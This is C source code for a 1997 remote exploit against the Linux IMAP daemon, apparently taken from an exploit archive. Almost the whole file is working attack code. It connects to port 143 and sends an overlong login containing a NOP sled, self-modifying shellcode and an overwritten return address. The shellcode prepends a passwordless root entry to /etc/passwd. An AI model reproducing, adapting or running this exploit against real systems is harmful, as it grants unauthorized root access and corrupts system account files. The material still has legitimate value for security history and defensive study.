/*

  This is the remote exploit of the hole in the imap daemon, for
  Linux.  The instruction code is doing open(), write(), and close()
  system calls, and  it adds a line root::0:0.. at the beggining of
  /etc/passwd (change to /etc/shadow if needed).  The  code needs to
  be self modifying since imapd turns everything to lowercase before
  it pushes it on the stack.  The problem  is that it  rewrites the
  first line of passwd/shadow,  therefore loosing the root password.

  I'm sorry, but I don't have time to add in the seek syscall.

  - Akylonius (aky@galeb.etf.bg.ac.yu) [1997]

  Modifications made on 5.1.97 to accept command line hostname,  with
  'h_to_ip' function that resolves it to an ip.  -  p1 (p1@el8.org)

*/

#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netdb.h>

char *h_to_ip(char *hostname);

char *h_to_ip(char *hostname) {

  struct hostent *h;
  struct sockaddr_in tmp;
  struct in_addr in;

  h = gethostbyname(hostname);

  if (h==NULL) { perror("Resolving the host. \n"); exit(-1); }

  memcpy((caddr_t)&tmp.sin_addr.s_addr, h->h_addr, h->h_length);
  memcpy(&in,&tmp.sin_addr.s_addr,4);

return(inet_ntoa(in));
}

void banner(void) {
  system("clear");
  printf("\nIMAP Exploit for Linux.\n");
  printf("\n\tAuthor: Akylonius (aky@galeb.etf.bg.ac.yu)\n");
  printf(" Modifications: p1 (p1@el8.org)\n");
}

main(int argc, char **argv) {

  int fd;
  struct sockaddr_in sckdaddr;
  char *hostname;
  char buf[4092];
  int i=8;
  char realegg[] =
    "\xeb\x58\x5e"
    "\x31\xdb\x83\xc3\x08\x83\xc3\x02\x88\x5e\x26"
    "\x31\xdb\x83\xc3\x23\x83\xc3\x23\x88\x5e\xa8"
    "\x31\xdb\x83\xc3\x26\x83\xc3\x30\x88\x5e\xc2"
    "\x31\xc0\x88\x46\x0b\x89\xf3\x83\xc0\x05\x31"
    "\xc9\x83\xc1\x01\x31\xd2\xcd\x80\x89\xc3\x31"
    "\xc0\x83\xc0\x04\x31\xd2\x88\x56\x27\x89\xf1"
    "\x83\xc1\x0c\x83\xc2\x1b\xcd\x80\x31\xc0\x83"
    "\xc0\x06\xcd\x80\x31\xc0\x83\xc0\x01\xcd\x80"
    "iamaselfmodifyingmonsteryeahiam\xe8\x83\xff\xff\xff"
    "/etc/passwdxroot::0:0:r00t:/:/bin/bashx";
  char *point = realegg;
  buf[0]='*';
  buf[1]=' ';
  buf[2]='l';
  buf[3]='o';
  buf[4]='g';
  buf[5]='i';
  buf[6]='n';
  buf[7]=' ';

  banner();

  if (argc<2)  {
     printf("\nUsage: %s <hostname>\n\n", argv[0]);
     exit(-1);
  }

  hostname=argv[1];

  while(i<1034-sizeof(realegg) -1) /* -sizeof(realegg)+1) */
    buf[i++]=0x90;

  while(*point)
    buf[i++]=*(point++);

  buf[i++]=0x83; /* ebp */
  buf[i++]=0xf3;
  buf[i++]=0xff;
  buf[i++]=0xbf;
  buf[i++]=0x88; /* ret adr */
  buf[i++]=0xf8;
  buf[i++]=0xff;
  buf[i++]=0xbf;

  buf[i++]=' ';
  buf[i++]='b';
  buf[i++]='a';
  buf[i++]='h';
  buf[i++]='\n';

  buf[i++]=0x0;


  if ((fd=socket(AF_INET,SOCK_STREAM,0))<0) perror("Error opening the
socket. \n");

  sckdaddr.sin_port=htons(143);
  sckdaddr.sin_family=AF_INET;
  sckdaddr.sin_addr.s_addr=inet_addr(h_to_ip(hostname));

  if (connect(fd,(struct sockaddr *) &sckdaddr, sizeof(sckdaddr)) < 0)
perror("Error with connecting. \n");

  printf("hmm: \n");
  getchar();
  write(fd,buf,strlen(buf)+1);
  printf("hmm: \n");
  close(fd);
}

// milw0rm.com [1997-06-24]
